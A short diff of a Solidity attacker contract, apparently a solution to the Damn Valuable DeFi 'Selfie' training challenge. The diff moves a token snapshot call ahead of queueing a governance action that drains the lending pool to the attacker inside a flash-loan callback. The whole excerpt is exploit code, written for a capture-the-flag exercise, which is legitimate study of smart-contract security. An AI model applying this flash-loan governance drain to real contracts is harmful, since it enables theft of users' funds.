@@ -31,14 +31,12 @@ contract Penetrator {
     }
 
     function receiveTokens(address _dvts, uint256 _amount) external {
+        dvts.snapshot();
         bytes memory payload = abi.encodeWithSignature(
             "drainAllFunds(address)",
             address(this)
         );
-
-        dvts.snapshot();
         actionId = gov.queueAction(address(pool), payload, 0);
-
         DamnValuableTokenSnapshot(_dvts).transfer(address(pool), _amount);
     }
 }
